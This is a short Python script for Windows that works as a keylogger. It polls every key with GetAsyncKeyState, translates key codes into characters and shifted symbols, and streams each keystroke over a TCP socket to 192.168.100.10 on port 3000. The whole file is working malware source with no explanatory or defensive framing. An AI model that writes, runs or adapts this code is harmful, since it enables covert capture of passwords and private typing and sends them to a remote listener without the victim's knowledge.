import socket
import ctypes
import time

serverAddress = ("192.168.100.10", 3000)
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(serverAddress)

user = ctypes.windll.user32

# Define ASCII mappings for characters, numbers, and symbols
asciiTable = {
    8: "[BACKSPACE]",
    9: "[TAB]",
    13: "[ENTER]",
    27: "[ESC]",
    32: " ",
    48: "0",
    49: "1",
    50: "2",
    51: "3",
    52: "4",
    53: "5",
    54: "6",
    55: "7",
    56: "8",
    57: "9",
    65: "A",
    66: "B",
    67: "C",
    68: "D",
    69: "E",
    70: "F",
    71: "G",
    72: "H",
    73: "I",
    74: "J",
    75: "K",
    76: "L",
    77: "M",
    78: "N",
    79: "O",
    80: "P",
    81: "Q",
    82: "R",
    83: "S",
    84: "T",
    85: "U",
    86: "V",
    87: "W",
    88: "X",
    89: "Y",
    90: "Z",
    186: ";",
    187: "=",
    188: ",",
    189: "-",
    190: ".",
    191: "/",
    192: "`",
    219: "[",
    220: "\\",
    221: "]",
    222: "'"
}

shiftSymbols = {
    48: ")",
    49: "!",
    50: "@",
    51: "#",
    52: "$",
    53: "%",
    54: "^",
    55: "&",
    56: "*",
    57: "(",
}

def main():
    keyStates = {}
    while True:
        for i in range(256):
            if user.GetAsyncKeyState(i) & 0x8000 != 0:
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    shiftPressed = user.GetKeyState(0x10) & 0x8000

                    if i in range(65, 91):  # A-Z
                        key = chr(i)
                        if not shiftPressed:
                            key = key.lower()
                    elif i in shiftSymbols and shiftPressed:
                        key = shiftSymbols[i]
                    else:
                        key = asciiTable.get(i, "")

                    if key:
                        try:
                            clientsocket.sendall(key.encode())
                        except Exception as e:
                            print(f"Error sending key: {e}")
            else:
                keyStates[i] = False
        time.sleep(0.01)

if __name__ == "__main__":
    main()



